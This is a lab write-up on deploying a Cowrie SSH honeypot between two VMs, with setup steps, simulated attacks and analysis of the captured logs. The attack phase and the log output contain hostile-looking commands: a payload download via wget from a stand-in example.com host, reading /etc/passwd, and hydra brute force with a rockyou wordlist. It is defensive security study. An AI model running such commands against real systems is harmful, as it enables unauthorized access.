# SSH Honeypot Project

**Setup:** Ubuntu Server VM as the honeypot and Kali VM as the attacker.

## Phase 1: Move Real SSH

**Goal:** Free port 22 for the honeypot by moving real SSH to port 22222.

**Why:** Port 22 must be free so attacker traffic can be sent to
Cowrie, while real admin access stays on a separate port.

**Steps:**

1. Confirm connectivity (Kali):
   ```bash
   ping 10.0.2.15
   ```
2. Move SSH to port 22222 (honeypot). Edit the config and change
   `#Port 22` to `Port 22222`:
   ```bash
   sudo nano /etc/ssh/sshd_config
   sudo systemctl daemon-reload
   sudo systemctl restart ssh.socket
   sudo ss -tlnp | grep 22222
   ```
3. Verify login on the new port (Kali):
   ```bash
   ssh -p 22222 labadmin@10.0.2.15
   ```

**Result:** Logged in from Kali on port 22222.

**Screenshots:** 1-5

## Phase 2: Install Cowrie

**Goal:** Install Cowrie under a dedicated least-privilege user.

**Why:** Running the honeypot under its own unprivileged account
limits the damage if an attacker escapes the fake shell.

**Steps:**

1. Install dependencies (honeypot):
   ```bash
   sudo apt install -y git python3-venv python3-dev libssl-dev libffi-dev build-essential authbind jq
   ```
2. Create the least-privilege Cowrie user (honeypot):
   ```bash
   sudo adduser --disabled-password --gecos "" cowrie
   sudo su - cowrie
   ```
3. GitHub clone timed out, so installed from PyPI instead (as cowrie):
   ```bash
   mkdir ~/cowrie && cd ~/cowrie
   python3 -m venv cowrie-env
   source cowrie-env/bin/activate
   pip install --upgrade pip
   pip install cowrie
   ```
4. Created working directories and config (as cowrie):
   ```bash
   mkdir -p etc var/log/cowrie var/lib/cowrie/tty var/lib/cowrie/downloads var/run
   nano etc/cowrie.cfg
   ```
   Contents of `etc/cowrie.cfg`:
   ```ini
   [honeypot]
   hostname = web-prod-01
   ```
5. Started and verified:
   ```bash
   cowrie start                  # as cowrie
   cowrie status                 # as cowrie
   sudo ss -tlnp | grep 2222     # as labadmin
   ```

**Result:** Cowrie running and listening on port 2222.

**Screenshots:** 6-8

## Phase 3: Port Redirect (iptables)

**Goal:** Send attacker traffic on the standard SSH port (22)
to Cowrie, which listens on port 2222.

**Why:** Cowrie runs as an unprivileged user, and Linux only
allows root to bind to ports below 1024. Instead of running
Cowrie as root, iptables redirects port 22 traffic to
port 2222 at the network level. Attackers see a normal SSH
service on port 22, making the honeypot less obvious.

**Port layout:**

- 22 -> redirected to Cowrie (what attackers see)
- 2222 -> Cowrie fake SSH
- 22222 -> real SSH for administration

**Steps:**

1. Add the NAT redirect rule (honeypot):
   ```bash
   sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
   ```
2. Persist the rule across reboots (saved IPv4, skipped IPv6):
   ```bash
   sudo apt install -y iptables-persistent
   ```
3. Verify the rule (honeypot):
   ```bash
   sudo iptables -t nat -L PREROUTING -n
   ```
   Output showed: `REDIRECT tcp dpt:22 redir ports 2222`
4. Test from the attacker side (Kali):
   ```bash
   ssh root@10.0.2.15
   ```

**Result:** The connection landed in Cowrie's fake shell (root@web-prod-01).

**Screenshots:** 9-10


## Phase 4: Attack Simulation

**Goal:** Simulate real attacker behavior against the honeypot from Kali
and confirm Cowrie captures it.

**Why:** A honeypot is only useful if it records what attackers do.
Running reconnaissance, an interactive session, and brute-force attacks
generates the data to analyze.

**Steps:**

1. Reconnaissance (Kali):
   ```bash
   nmap -sV -p 22,2222,22222 10.0.2.15
   ```
   Result: Ports 22 and 2222 reported OpenSSH 9.2p1 Debian 2+deb12u3
   (Cowrie's default fake banner). Port 22222 reported OpenSSH 10.2p1
   Ubuntu 2ubuntu3.8 (the real server). Cowrie acted as a normal SSH
   service, but two fingerprinting risks are visible: a Debian banner
   on an Ubuntu host, and identical SSH banners on 22 and 2222.

2. Interactive attacker session (Kali). Logged in as root with an
   arbitrary password and ran:
   ```bash
   ssh root@10.0.2.15
   whoami
   uname -a
   cat /etc/passwd
   ls -la /root
   wget https://example.com/payload.sh
   cat /proc/cpuinfo
   ```
   Result: Commands returned fake output from Cowrie's emulated system.

3. Configured Cowrie authentication (honeypot, as cowrie). The PyPI
   install had no userdb.txt, so Cowrie used defaults that accepted
   most usernames. So I created a custom user database:
   ```bash
   nano etc/userdb.txt
   cowrie restart
   ```
   Rules: root allowed with any password except `root` and `123456`;
   all other usernames are rejected.
   ```
   root:x:!root
   root:x:!123456
   root:x:*
   ```

   

4. Brute-force attacks with the top 200 rockyou passwords (Kali):
   ```bash
   head -200 /usr/share/wordlists/rockyou.txt > top200.txt
   hydra -l admin -P top200.txt -t 4 -I ssh://10.0.2.15
   hydra -l root -P top200.txt -t 4 -I ssh://10.0.2.15
   ```

**Result:**

- admin: 0 valid passwords (all 200 attempts rejected and logged)
- root: 3 valid passwords found (password, 12345, 123456789);
  123456 and root rejected as configured

**Problems and fixes:**

- Default config accepted `admin`. Fixed by creating userdb.txt.
- Hydra reported several "valid" passwords per user rather than one.
  Hydra stops testing a user after the first success, but with 4
  parallel tasks, other attempts also succeeded first.
- The first userdb.txt did not save, leaving an empty file. An empty
  user database rejected every login, so root also failed. I recreated
  the file and verified the contents with `cat`.
- Initially omitted the `!` before 123456 in userdb.txt, which turned the block
  rule into an allow rule. Fixed and verified with a rerun.

**Screenshots:** 11-14


## Phase 5: Log Analysis

**Goal:** Report findings about attacker behavior from Cowrie's logs.

**Why:** Analysis of the logs shows what attackers tried, which tools 
they used, and what they did after gaining access.

**Data note:** The logs include all test runs, including misconfigured
ones (no userdb.txt, empty userdb.txt, missing `!`). Counts reflect
the full dataset, not a single clean run.

**Tools:** grep, cut, sed, sort, uniq, jq on cowrie.json 


1. Event summary
   ```bash
   cat cowrie.json* | jq -r '.eventid' | sort | uniq -c | sort -rn
   ``` 
   **Result:** 
     837 "cowrie.login.failed"
     93 "cowrie.session.connect"
     93 "cowrie.session.closed"
     88 "cowrie.client.version"
     88 "cowrie.client.kex"
     25 "cowrie.login.success"
     17 "cowrie.command.input"
      8 "cowrie.client.var"
      4 "cowrie.session.params"
      4 "cowrie.log.closed"
      4 "cowrie.client.size"
      1 "cowrie.session.file_download"

      **Explanation:** 93 connections were recorded, but only 88 included
   a client version. The difference is most likely the nmap scans,
   which read the SSH banner and disconnect without logging in.

2. Login outcomes
   ```bash
   cat cowrie.json* | grep "login attempt" | grep -E "succeeded|failed" | cut -d ":" -f8,10 | tr -d '"' | sed 's/,password:cowrie.login./ /; s/,sensor//' | sort | uniq -c
   ```
   **Result:** admin 418 failed / 4 succeeded; root 419 failed / 21 succeeded
   **Explanation:** admin successes came from the run before userdb.txt
   existed. After configuration, admin was rejected 100% of the time.

3. Top attempted credentials
   ```bash
   cat cowrie.json* | jq -r 'select(.eventid | startswith("cowrie.login")) | "\(.username):\(.password)"' | sort | uniq -c | sort -rn | head -15
   ```
   **Result:**  
      7 root:password
      7 root:123456789
      7 root:123456
      7 root:12345
      4 root:whatever
      4 root:stephanie
      4 root:peanut
      4 root:password123
      4 root:jonathan
      4 root:ginger
      4 root:computer
      4 root:blink182
      4 root:987654321
      4 admin:whatever
      4 admin:stephanie
   **Explanation:** The counts show how many times each password was
tried across all test runs. Passwords at the top of the wordlist,
such as 123456 and password, were tried in every run, so they have
the highest counts. These are the same common passwords real
attackers try first, because they come from real leaked password
lists.

4. Client fingerprints

   ```bash
   cat cowrie.json* | jq -r 'select(.eventid=="cowrie.client.version") | .version' | sort | uniq -c
   ```
**Result:** 82 SSH-2.0-libssh_0.12.0
            6 SSH-2.0-OpenSSH_10.3p1 Debian-4

**Explanation:** Hydra was identified as libssh while manual sessions
showed OpenSSH, so the attacking tool can be identified from logs.

5. Commands run
   ```bash
   cat cowrie.json* | jq -r 'select(.eventid=="cowrie.command.input") | "\(.timestamp) \(.input)"'
   ```
   **Result:** 2026-10-25T01:23:57.852782Z exit
               2026-10-25T02:41:06.701689Z clear
               2026-10-26T02:33:32.927729Z whoami
               2026-10-26T02:33:48.318296Z uname -a
               2026-10-26T02:34:01.587192Z cat /etc/passwd
               2026-10-26T02:34:23.575537Z ls -la /root
               2026-10-26T02:34:57.347872Z clear
               2026-10-26T02:35:02.508921Z exit
               2026-10-26T02:35:15.429285Z whoami
               2026-10-26T02:35:20.228301Z uname -a
               2026-10-26T02:35:25.091247Z cat /etc/passwd
               2026-10-26T02:35:37.477758Z ls -la /root
               2026-10-26T02:37:08.998677Z clear
               2026-10-26T02:38:05.231807Z wget https://example.com/payload.sh
               2026-10-26T02:38:35.021870Z cat /proc/cpuinfo
               2026-10-26T02:39:56.378125Z clear
               2026-10-26T02:40:03.853500Z exit

   **Explanation:** First, the attacker tried reconnaissance (whoami, uname, /etc/passwd), followed by a payload download attempt, which is a typical post-login attacker sequence.

6. Download attempts
```bash
cat cowrie.json* | jq -c 'select(.eventid | startswith("cowrie.session.file_download"))'
```
   **Result:** 1 successful download of https://example.com/payload.sh,
   saved to var/lib/cowrie/downloads/ with SHA-256 25ddf2c8...4a62e484.
   I did an inspection with `file` and it showed an HTML page, not a script.

   **Explanation:** The file turned out to be a harmless HTML page, which shows why samples
   must be inspected or hash-checked before being called malicious. Cowrie also made a real outbound request, so production honeypots should restrict outbound traffic.

7. Session replay
   ```bash
   ls ~/cowrie/var/lib/cowrie/tty/
   playlog ~/cowrie/var/lib/cowrie/tty/<filename>
   ```
   **Result:** Replayed the 2026-10-26 session. The recording showed
every command the attacker typed, in order and at the original
speed.

   **Explanation:** Cowrie records each attacker session like a video
of their terminal. This lets an analyst watch exactly what an
attacker did after logging in, not just read a list of commands. This can
be extremely useful for analyzing suspicious activity and learning what 
measures to take against the attacks used.

   **Problems and fixes:**
   Json files contain certain formatting that makes the logs a bit tough to filter. At first I was using grep, cut, tr, etc. but then I used jq as a better alternative.
   

   **Screenshots:** 15-20


